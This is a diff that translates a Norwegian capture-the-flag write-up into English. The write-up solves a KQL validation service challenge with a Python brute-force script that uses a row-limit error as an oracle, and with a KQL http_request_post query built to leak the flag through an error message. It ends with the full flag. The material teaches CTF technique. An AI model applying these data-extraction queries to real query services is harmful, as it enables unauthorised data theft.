@@ -1,35 +1,35 @@
 ## KQL VALIDATION SERVICE
 
-### Løsning
+### Solution
 
-Vi tar utgangspunkt i en prompt vi utledet for å løse forrige oppgave:
+We start with a prompt we derived to solve the previous challenge:
 
 ```kql
 search * | where * contains "$$" and * contains "}"
 ```
 
-Etter litt testing finner vi en feilmelding som kan utnyttes for å røpe data:
+After some testing, we encounter an error message that can be exploited to reveal data:
 
 ```
 Query execution has exceeded the allowed limits (80DA0003): The results of this query exceed the set limit of 500 records
 ```
 
-Vi utnytter grenseverdien på 500 rader og bruker en loop som returnerer mer 501 rader dersom den klarer å finne starten på flagget i databasen. pack_all kombinerer alle kolonnene til én, toscalar konverterer første rad til en string (vi har bare én rad):
+We exploit the 500-row limit and use a loop that returns more than 501 rows if it manages to find the start of the flag in the database. `pack_all` combines all columns into one, and `toscalar` converts the first row into a string (we only have one row):
 
 ```kql
 range n from 1 to toscalar(search * | where * contains "ept{" | count)*501 step 1
 ```
 
-Feilmeldingen dukket opp også denne gangen. Det tyder på at vi kan finne flagget på denne måte. Dette kan scriptes for å bruteforce én og én bokstav:
+The error message appeared again this time, indicating that we can find the flag in this way. This can be scripted to brute force one letter at a time:
 
-```py
+```python
 import requests
 import string
 
 def brute(url, query, word):
     for i in range(50):
         for letter in string.digits + string.ascii_lowercase + "<>,./:*@'+-$_-?!}= ":
-            # Use replace placaolder with payload
+            # Use replace placeholder with payload
             query_to_run = query.replace("$$", word+letter)
 
             response = requests.post(url, headers={"content-type": "application/json"}, json={ "query": query_to_run})
@@ -45,34 +45,33 @@ def brute(url, query, word):
 brute("https://_uniqueid_-kqlvalidation.ept.gg/validate_kql", 'range n from 1 to toscalar(search * | where * contains "$$" and * contains "}" | count)*501 step 1', "EPT{6x+jd$")
 ```
 
-Dette er en teoretisk løsning som ville fungert for korte flagg. Dessverre viste flagget seg å være for langt til å løse på denne måten. Dette er fordi det er lagt inn et internt delay på websiden som tvinger siden til å holde igjen i minst 3 sekunder før vi får svar. Den teoretiske tiden det ville tatt å finne flagget på denne måten vil derfor være:
+This is a theoretical solution that would work for short flags. Unfortunately, the flag turned out to be too long to solve in this way. This is because an internal delay has been added to the website, forcing the page to hold for at least 3 seconds before we get a response. The theoretical time it would take to find the flag this way is:
 
-```py
-possibilities = len(string.digits + string.ascii_lowercase + "<>,./:*@'+-$_-?!}= ") # Antall tegn
-time_pr_try = 3 # sekunder pr test
+```python
+possibilities = len(string.digits + string.ascii_lowercase + "<>,./:*@'+-$_-?!}= ") # Number of characters
+time_pr_try = 3 # seconds per test
 avg_time_pr_char = possibilities/2 * 3
-flag_len = 188 - len("ept{" + "}") # (fant flagget på en annen måte senere, så vi vet lengden)
+flag_len = 188 - len("ept{" + "}") # (found the flag another way later, so we know the length)
 total_time = flag_len * avg_time_pr_char
 ```
 
-Total tid blir 15097s eller 4t 11min.
+The total time would be 15097s or 4 hours 11 minutes.
 
-Og ikke en gang da kan vi garantere at vi har rett, fordi søket kun matcher bokstaver i lowercase, så om det ikke blir akseptert av CTFd vil vi ikke få rett.
+And even then, we cannot guarantee that we are correct, because the search only matches lowercase letters. If it is not accepted by CTFd, we won’t get the correct answer.
 
+## Solution 2
 
-## Løsning 2
+Another solution (which we assume is more as intended) is to take advantage of the fact that we have plugins to send HTTP requests. We know this because it is listed under `/cluster_policies` on the website.
 
-En annen løsning (antar at dette er mer som intended) er å utnytte at vi har plugins for å sende http requests. Det vet vi fordi det står under `/cluster_policies` på websiden.
+Here, we can either set up a server to receive the request or craft a request that fails after we find the flag, so the flag is included in the error message.
 
-Her kan vi enten velge å sette opp en server for å ta imot requesten, eller vi kan lage en request som feiler etter at vi har funnet flagget slik at flagget blir med i feilmeldingen.
-
-Først henter vi ut raden som inneholder flagget og gjør det om fra en tabellentry til en string:
+First, we extract the row that contains the flag and turn it from a table entry into a string:
 
 ```kql
 toscalar(search * | where * contains "ept{" and * contains "}" | project p = pack_all())
 ```
 
-Så setter vi stringen inn som parameter i en request vi vet kommer til å feile:
+Then, we insert the string as a parameter in a request we know will fail:
 
 ```kql
 evaluate http_request_post(
@@ -82,12 +81,12 @@ evaluate http_request_post(
 )
 ```
 
-Som vi ser får vi flagget tilbake i en feilmelding, altså trenger vi aldri å sende requesten:
+As we can see, the flag is returned in an error message, meaning we never need to send the request:
 
 ![alt text](image.png)
 
 <details>
-<summary>Flagg</summary>
+<summary>Flag</summary>
 
 `EPT{6X+Jd$>this_is_A_v3ry_long_fl4g_d0nt_try_to_brute_force_itt=B+----J-P.=pEv'GvAJ$aFdyRia.ABjwgv_7'j7''FY*I'JI,z@K1dvPLE@>R9!6x3O4hYG_5!/HnD/gt_g::S9'IgD'5@vbBfAcUOrv'u<4O=$,'IE./=DY$RX}`
 </details>
